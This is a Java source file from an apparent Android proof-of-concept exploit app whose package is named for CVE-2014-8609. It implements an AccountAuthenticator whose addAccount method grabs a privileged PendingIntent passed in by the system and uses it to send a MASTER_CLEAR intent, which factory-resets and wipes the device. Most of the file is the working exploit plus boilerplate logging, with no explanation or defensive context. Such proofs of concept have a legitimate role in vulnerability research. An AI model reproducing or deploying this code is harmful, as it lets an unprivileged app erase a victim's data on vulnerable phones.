package com.example.cve_2014_8609_exploit;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class AccountAuthenticator extends AbstractAccountAuthenticator {

    private Context mContext;

    public AccountAuthenticator(Context context)
    {
        super(context);
        mContext = context;
        Log.d("DEBUG", "----- Account Authenticator Constructor ------ " + System.nanoTime());
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle options) throws NetworkErrorException {
        Log.d("DEBUG", "----- Add account ------ " + System.nanoTime());

        PendingIntent test = (PendingIntent) options.getParcelable("pendingIntent");

        Log.d("DEBUG", "----- Pending Intent ------ \n" + test.toString());

        Intent newIntent2 = new Intent("android.intent.action.MASTER_CLEAR");
        try {
            test.send(mContext, 0, newIntent2, null, null);
        } catch (PendingIntent.CanceledException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        final Intent intent = new Intent(mContext, MainActivity.class);
        final Bundle bundle = new Bundle();
        bundle.putParcelable(AccountManager.KEY_INTENT, intent);
        return bundle;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) {
        Log.d("DEBUG", "----- Edit Properties ------ " + System.nanoTime());
        return null;
    }


    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
        Log.d("DEBUG", "----- Confirm Credentials ------ " + System.nanoTime());
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        Log.d("DEBUG", "----- Get Auth Token ------ " + System.nanoTime());
        return null;
    }

    @Override
    public String getAuthTokenLabel(String s) {
        Log.d("DEBUG", "----- Get Auth Token Label ------ " + System.nanoTime());
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        Log.d("DEBUG", "----- Update Credentials ------ " + System.nanoTime());
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
        Log.d("DEBUG", "----- Has Features ------ " + System.nanoTime());
        return null;
    }

    @Override
    public Bundle getAccountRemovalAllowed(AccountAuthenticatorResponse response, Account account) throws NetworkErrorException {
        Log.d("DEBUG", "----- Get Account Removal Allowed ------ " + System.nanoTime());
        return super.getAccountRemovalAllowed(response, account);
    }
}
